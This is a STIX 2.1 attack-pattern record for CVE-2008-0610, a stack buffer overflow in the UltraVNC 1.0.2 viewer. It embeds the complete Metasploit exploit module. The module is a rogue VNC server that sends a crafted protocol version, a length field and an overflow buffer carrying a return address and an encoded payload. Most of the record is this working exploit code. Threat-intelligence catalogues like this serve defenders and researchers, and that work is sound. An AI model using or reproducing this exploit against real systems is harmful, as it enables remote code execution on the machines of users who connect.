{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--06e7c2e9-9353-4427-8769-f2def5e888ef",
    "created": "2024-08-14T16:48:53.47584Z",
    "modified": "2024-08-14T16:48:53.475844Z",
    "name": "UltraVNC 1.0.2 Client (vncviewer.exe) Buffer Overflow",
    "description": " This module exploits a buffer overflow in UltraVNC Viewer 1.0.2 Release.  If a malicious server responds to a client connection indicating a minor protocol version of 14 or 16, a 32-bit integer is subsequently read from the TCP stream by the client and directly provided as the trusted size for further reading from the TCP stream into a 1024-byte character array on the stack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/vnc/ultravnc_viewer_bof.rb",
            "external_id": "ultravnc_viewer_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0610"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'UltraVNC 1.0.2 Client (vncviewer.exe) Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow in UltraVNC Viewer 1.0.2 Release.\n\n        If a malicious server responds to a client connection indicating a minor\n        protocol version of 14 or 16, a 32-bit integer is subsequently read from\n        the TCP stream by the client and directly provided as the trusted size for\n        further reading from the TCP stream into a 1024-byte character array on\n        the stack.\n      },\n      'Author'         => 'noperand',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-0610' ],\n          [ 'OSVDB', '42840' ],\n          [ 'BID', '27561' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3',\t{ 'Ret' => 0x00421a61 } ], # vncviewer.exe, 1.0.2\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2008-02-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The VNCServer daemon port to listen on\", 5900 ])\n      ])\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    sploit = rand_text_alpha(1100)   \t# junk, could be more efficient here\n    sploit << \"\\x00\\x04\\x00\\x00\" \t \t# value to get around a write\n    sploit << rand_text_alpha(12)\t \t# random junk\n    sploit << \"\\xEB\\x06\" << make_nops(2)\t# short relative jump\n    sploit << [target.ret].pack('V') \t# pop/pop/ret (default is in vncviewer.exe)\n    sploit << payload.encoded\n\n=begin\n    We prepend the initial 12 bytes including the servers' desired protocol version (\"RFB 003.016\").\n    - These bytes are read directly by a call to ReadExact() with a size of 12.\n\n    ...\n    if (m_minorVersion == 14 || m_minorVersion == 16)\n    {\n      int size;\n      ReadExact((char *)&size,sizeof(int));\n      char mytext[1024]; //10k\n      ReadExact(mytext,size);\n      mytext[size]=0;\n    ...\n\n    If minor version is 16 or 14, a 32-bit integer follows indicating the size of our data to read.\n    We then append our data.\n=end\n    sploit = \"\\x52\\x46\\x42\\x20\\x30\\x30\\x33\\x2e\\x30\\x31\\x36\\x0a\" << [sploit.length].pack('N') << sploit\n\n    print_status(\"Sending #{sploit.length} bytes to #{client.getpeername}:#{client.peerport}...\")\n    client.put(sploit)\n    handler(client)\n    service.close_client(client)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-02-06",
    "x_mitre_platforms": [
        "win'"
    ]
}